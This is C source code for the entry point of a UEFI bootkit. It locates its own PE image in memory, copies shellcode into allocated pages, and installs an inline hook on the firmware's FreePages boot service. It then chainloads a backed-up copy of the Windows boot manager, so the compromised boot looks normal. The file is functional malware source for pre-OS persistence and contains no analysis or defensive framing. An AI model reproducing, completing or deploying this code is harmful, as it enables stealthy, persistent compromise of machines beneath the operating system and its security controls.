#include "EfiMain.h"
#include "Debug.h"

/* Path to original boot manager (must match BootkitInstaller.cs
 * ORIG_BOOTMGR_NAME) */
static CHAR16 OrigBootMgrPath[] =
    L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi.bak.original";

/* EFI GUIDs we need */
static EFI_GUID gEfiLoadedImageProtocolGuid = {
    0x5B1B31A1,
    0x9562,
    0x11D2,
    {0x8E, 0x3F, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B}};
static EFI_GUID gEfiSimpleFileSystemProtocolGuid = {
    0x964E5B22,
    0x6459,
    0x11D2,
    {0x8E, 0x39, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B}};
static EFI_GUID gEfiDevicePathProtocolGuid = {
    0x09576E91,
    0x6D3F,
    0x11D2,
    {0x8E, 0x39, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B}};

/*!
 *
 * Purpose:
 *
 * Entry point for the bootkit.
 * Sets up FreePages hook then chainloads the original boot manager.
 *
!*/
D_SEC(A)
EFI_STATUS EFIAPI EfiMain(IN EFI_HANDLE ImageHandle,
                          IN EFI_SYSTEM_TABLE *SystemTable) {
  UINT64 Len = 0;
  UINT64 Pgs = 0;
  EFI_PHYSICAL_ADDRESS Epa = 0;
  EFI_STATUS Status = EFI_SUCCESS;
  EFI_HANDLE OrigImageHandle = NULL;
  UINTN ExitDataSize = 0;

  PGENTBL Gen = NULL;
  PIMAGE_DOS_HEADER Dos = NULL;
  PIMAGE_NT_HEADERS Nth = NULL;

  /* Loaded image protocol for getting device handle */
  EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;
  EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem = NULL;
  EFI_FILE_PROTOCOL *RootDir = NULL;
  EFI_FILE_PROTOCOL *OrigFile = NULL;
  EFI_FILE_INFO *FileInfo = NULL;
  VOID *FileBuffer = NULL;
  UINTN FileSize = 0;
  UINTN InfoSize = 0;
  EFI_DEVICE_PATH_PROTOCOL *DevicePath = NULL;

  /* Use our label to the general table */
  Gen = C_PTR(G_PTR(GenTbl));

  /* Align to the start of the section */
  Dos = C_PTR(G_PTR(EfiMain) & ~EFI_PAGE_MASK);

  do {
    /* Has the DOS magic? */
    if (Dos->e_magic == IMAGE_DOS_SIGNATURE) {
      /* Retrieve a pointer to the NT headers */
      Nth = C_PTR(U_PTR(Dos) + Dos->e_lfanew);

      /* Has the NT magic? */
      if (Nth->Signature == IMAGE_NT_SIGNATURE) {
        /* Leave! */
        break;
      }
    }
    /* Step back to the previus page */
    Dos = C_PTR(U_PTR(Dos) - EFI_PAGE_SIZE);
  } while (TRUE);

  /* Calculate the length of the shellcode */
  Len = U_PTR(G_PTR(G_END) - G_PTR(FreePagesHook));

  /* Calculate the number of pages needed for allocation */
  Pgs = U_PTR((Len >> EFI_PAGE_SHIFT) + ((Len & EFI_PAGE_MASK) ? 1 : 0));

  /* Allocate new pages for shellcode */
  if (SystemTable->BootServices->AllocatePages(AllocateAnyPages, EfiLoaderCode,
                                               Pgs, &Epa) == EFI_SUCCESS) {
    /* Save reference to the system table */
    Gen->SystemTable = C_PTR(SystemTable);

    LOG_DEBUG(L"Bootkit initializing...");

    /* Save the original routine address */
    Gen->FreePages = C_PTR(SystemTable->BootServices->FreePages);

    /* Inject the shellcode into allocated pages */
    for (INT Ofs = 0; Ofs < Len; ++Ofs) {
      *(PUINT8)(C_PTR(U_PTR(Epa) + Ofs)) =
          *(PUINT8)(C_PTR(U_PTR(G_PTR(FreePagesHook) + Ofs)));
    }

    /* Install inline hook into system table */
    SystemTable->BootServices->FreePages = C_PTR(U_PTR(Epa));

    /* Hook installed - now chainload original boot manager */
    LOG_DEBUG(L"FreePages hook installed");
  } else {
    /* Failed to allocate - try to boot anyway */
    LOG(L"Warning: Hook allocation failed");
  }

  /* ================================================================
   * CHAINLOAD ORIGINAL BOOT MANAGER
   * ================================================================ */

  /* Get the loaded image protocol to find our device */
  Status = SystemTable->BootServices->HandleProtocol(
      ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&LoadedImage);

  if (EFI_ERROR(Status) || LoadedImage == NULL) {
    LOG(L"Error: Cannot get loaded image protocol");
    goto FAIL;
  }

  LOG_DEBUG(L"Loaded image protocol: OK");

  /* Get the file system protocol from our device */
  Status = SystemTable->BootServices->HandleProtocol(
      LoadedImage->DeviceHandle, &gEfiSimpleFileSystemProtocolGuid,
      (VOID **)&FileSystem);

  if (EFI_ERROR(Status) || FileSystem == NULL) {
    LOG(L"Error: Cannot get file system protocol");
    goto FAIL;
  }

  /* Open the root directory */
  Status = FileSystem->OpenVolume(FileSystem, &RootDir);
  if (EFI_ERROR(Status) || RootDir == NULL) {
    LOG(L"Error: Cannot open volume");
    goto FAIL;
  }

  /* Open the original boot manager file */
  Status =
      RootDir->Open(RootDir, &OrigFile, OrigBootMgrPath, EFI_FILE_MODE_READ, 0);

  if (EFI_ERROR(Status) || OrigFile == NULL) {
    LOG(L"Error: Cannot find bootmgfw_orig.efi");
    goto FAIL;
  }

  LOG_DEBUG(L"Original boot manager found");

  /* Get file size - first call to get required buffer size */
  InfoSize = 0;
  Status = OrigFile->GetInfo(OrigFile, &gEfiFileInfoGuid, &InfoSize, NULL);

  /* Allocate buffer for file info */
  Status = SystemTable->BootServices->AllocatePool(EfiLoaderData, InfoSize,
                                                   (VOID **)&FileInfo);
  if (EFI_ERROR(Status)) {
    LOG(L"Error: Cannot allocate file info buffer");
    goto FAIL;
  }

  /* Get file info */
  Status = OrigFile->GetInfo(OrigFile, &gEfiFileInfoGuid, &InfoSize, FileInfo);
  if (EFI_ERROR(Status)) {
    LOG(L"Error: Cannot get file info");
    goto FAIL;
  }

  FileSize = (UINTN)FileInfo->FileSize;

  /* Allocate buffer for file content */
  Status = SystemTable->BootServices->AllocatePool(EfiLoaderData, FileSize,
                                                   &FileBuffer);
  if (EFI_ERROR(Status)) {
    LOG(L"Error: Cannot allocate file buffer");
    goto FAIL;
  }

  /* Read the file */
  Status = OrigFile->Read(OrigFile, &FileSize, FileBuffer);
  if (EFI_ERROR(Status)) {
    LOG(L"Error: Cannot read original boot manager");
    goto FAIL;
  }

  /* Close file handles */
  OrigFile->Close(OrigFile);
  RootDir->Close(RootDir);

  /* Load the original boot manager from memory buffer */
  Status = SystemTable->BootServices->LoadImage(
      TRUE,                  /* BootPolicy */
      ImageHandle,           /* ParentImageHandle */
      LoadedImage->FilePath, /* DevicePath (reuse ours) */
      FileBuffer,            /* SourceBuffer */
      FileSize,              /* SourceSize */
      &OrigImageHandle       /* ImageHandle */
  );

  if (EFI_ERROR(Status)) {
    LOG(L"Error: Cannot load original boot manager");
    goto FAIL;
  }

  LOG_DEBUG(L"Boot manager loaded, starting...");

  /* Free the file buffer - image is now loaded */
  SystemTable->BootServices->FreePool(FileBuffer);
  FileBuffer = NULL;

  if (FileInfo) {
    SystemTable->BootServices->FreePool(FileInfo);
    FileInfo = NULL;
  }

  /* Start the original boot manager - this should not return */
  Status = SystemTable->BootServices->StartImage(OrigImageHandle, &ExitDataSize,
                                                 NULL);

  /* If we get here, something went wrong */
  LOG(L"Error: Original boot manager returned unexpectedly");
  return Status;

FAIL:
  /* Critical error - cannot boot */
  LOG(L"CRITICAL: Cannot chainload boot manager!");
  LOG(L"System cannot boot. Power off and restore backup.");

  /* Infinite loop to prevent undefined behavior */
  for (;;) {
    SystemTable->BootServices->Stall(1000000); /* 1 second */
  }

  return EFIERR(0x100);
}
E_SEC;
